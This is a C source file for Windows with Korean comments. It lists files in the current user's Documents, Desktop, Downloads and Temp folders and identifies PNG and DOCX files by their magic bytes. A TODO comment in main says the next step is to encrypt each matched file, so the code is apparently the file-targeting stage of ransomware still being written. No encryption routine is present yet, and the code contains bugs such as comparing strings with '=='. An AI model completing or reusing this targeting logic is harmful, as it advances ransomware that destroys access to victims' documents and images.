#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>
#include <windows.h>

#define MAX_LEN 512

// 경로별 구조체 생성
struct directory_document{
    char *file_name;   // 파일명
    char *file_type;   // 파일인지, 디렉터리인지
    char *file_signature; // 파일 시그니처값
    int count;         // 파일 및 디렉토리 수
};

struct directory_document* document_dir;
struct directory_document* desktop_dir;
struct directory_document* downloads_dir;
struct directory_document* temp_dir;

void directory_indexing(char *directory_list[], int directory_list_len){
    for (int i = 0; i < directory_list_len; i++){
        int file_count = 0;
        WIN32_FIND_DATAA data;
        printf("\nFind %s Directory: \n",directory_list[i]);

        HANDLE hFind = FindFirstFileA(directory_list[i], &data);

        struct directory_document** target_dir = NULL;

        switch(i) {
            case 0:
                target_dir = &document_dir;
                break;
            case 1:
                target_dir = &desktop_dir;
                break;
            case 2:
                target_dir = &downloads_dir;
                break;
            case 3:
                target_dir = &temp_dir;
                break;
        }

        *target_dir = malloc(sizeof(struct directory_document)); 

        do {
            if(!(data.dwFileAttributes & FILE_ATTRIBUTE_SYSTEM) && strcmp(data.cFileName, "..") != 0 && strcmp(data.cFileName, ".") != 0){
                file_count++;

                *target_dir = realloc(*target_dir, sizeof(struct directory_document) * file_count);

                (*target_dir)[file_count - 1].file_name = strdup(data.cFileName);
                (*target_dir)[file_count - 1].file_type = (data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) ? "Directory" : "File";
                (*target_dir)[file_count - 1].file_signature = "unknown";

                //printf("%s: %s\n", (*target_dir)[file_count - 1].file_type, (*target_dir)[file_count - 1].file_name);
            }
        } while(FindNextFileA(hFind, &data));

        FindClose(hFind);

        printf("file count: %d\n\n",file_count);

        (*target_dir)[0].count = file_count;
    }

    return;
}

void print_directory_contents(struct directory_document* dir) {
    for(int i = 0; i < dir[0].count; i++) {
        printf("File Name: %s, File Type: %s, File Signature: %s\n", dir[i].file_name, dir[i].file_type,dir[i].file_signature);
    }
    return;
}

char* file_Signatures_check(unsigned char* buffer, long file_size){

    char* signatures_array_alias[2] = {"png","docx"}; //구조체에 저장할 파일 시그니처 명
    unsigned char* signatures_array[2] = {(unsigned char*)"\x89\x50\x4E\x47\x0D\x0A\x1A\x0A", (unsigned char*)"\x50\x4B\x03\x04\x14\x00\x06\x00"}; //실제 시그니처값
    int signature_array_value_len[2] = {8, 8}; // 시그니처값의 길이

    int signatures_array_len = sizeof(signatures_array) / sizeof(signatures_array[0]);
    
    //printf("signatures_list_len: %d\n", signatures_array_len);

    for (int i = 0; i < signatures_array_len; i++){

        for (int j = 0; j <signature_array_value_len[i]; j++){
            // printf("signatures_%d_array , %dth value: %02x\n",i, j,signatures_array[i][j]);
            // printf("file hex value: %02x\n",buffer[j]);
            // printf("j:%d\n",j);
            // printf("i:%d\n",i);
            if(signatures_array[i][j] == buffer[j]){
                printf("is matching\n");
            }
            else{
                printf("not matching\n");

                break;
            }

            //여기까지 왔다는건 모두 매칭되었다는 뜻
            if (j == signature_array_value_len[i]-1){                
                return signatures_array_alias[i];
            }
        }
        printf("\n");
    }
    

    printf("\n");
    return "unknown";
}

void file_binary_check(struct directory_document* dir, char* directory){
    for(int i = 0; i < dir[0].count; i++){
        if(dir[i].file_type == "Directory"){
            continue;
        }
        char* file_names = dir[i].file_name;

        char full_path[1024];
        snprintf(full_path, sizeof(full_path), "%s%s", directory, file_names);
        printf("open file: %s\n",full_path);


        FILE* file = fopen(full_path, "rb");
        if (file == NULL) {
            printf("Could not open file %s\n", full_path);
            continue;
        }

        // 파일 크기 확인
        fseek(file, 0, SEEK_END);
        long file_size = ftell(file);
        rewind(file);

        // 메모리 할당
        unsigned char* buffer = malloc(file_size);
        if (buffer == NULL) {
            printf("Could not allocate memory for file %s\n", full_path);
            continue;
        }

        // fread
        size_t result = fread(buffer, 1, file_size, file);
        if (result != file_size) {
            printf("Reading error for file %s\n", full_path);
            continue;
        }

        //출력
        // for (int j = 0; j < file_size; j++) {
        //    printf("%02x ", buffer[j]);
        // }
        // printf("\n");

        // 구조체에 시그니처값 적용
        dir[i].file_signature = file_Signatures_check(buffer, file_size);

        // 메모리 해제
        free(buffer);
        fclose(file);

        
    }
    return;
}




int main(){
    char *directory_list[4] = {"C:\\Users\\user\\Documents\\*", "C:\\Users\\user\\Desktop\\*", "C:\\Users\\user\\Downloads\\*", ""};

    DWORD dwsize = MAX_LEN;
    char strUserName[MAX_LEN] = { 0 };

    int nError = GetUserNameA(strUserName, &dwsize);
    if (!nError) {
        printf("GetUserNameA function is ERROR\n");
        return -1;
    }
    printf("Get Username: %s\n", strUserName);

    char temp_directory[MAX_LEN] = { 0 };
    sprintf(temp_directory, "C:\\Users\\%s\\Appdata\\Local\\Temp\\*", strUserName);
    directory_list[3] = temp_directory;

    directory_indexing(directory_list, sizeof(directory_list)/ sizeof(directory_list[0]));

    printf("\nDocument Directory:\n");
    print_directory_contents(document_dir);
    
    printf("\nDesktop Directory:\n");
    print_directory_contents(desktop_dir);
    
    printf("\nDownloads Directory:\n");
    print_directory_contents(downloads_dir);
    
    printf("\nTemp Directory:\n");
    //print_directory_contents(temp_dir);

    // memory free 잊지말기.
    /* 
    TODO: 
    파일을 하나씩 읽고, 시그니처값을 검사하여 암호화까지. 
    메모리 할당을 한 번 해주고, 암호화가 끝나는 방식으로 해야됨.
    모든 파일의 바이너리값을 한번에 저장하고, 시그니처를 하나씩 검사하게 된다면 메모리가 부족할거임.
    결론: 구조체에 있는 파일을 하나씩 fread(binary로) 하고, 시그니처를 확인하여 암호화를 진행해야함.
    */
    file_binary_check(document_dir,"C:\\Users\\user\\Documents\\");
    printf("\nnew Document Directory:\n");
    print_directory_contents(document_dir);

    return 1;
}
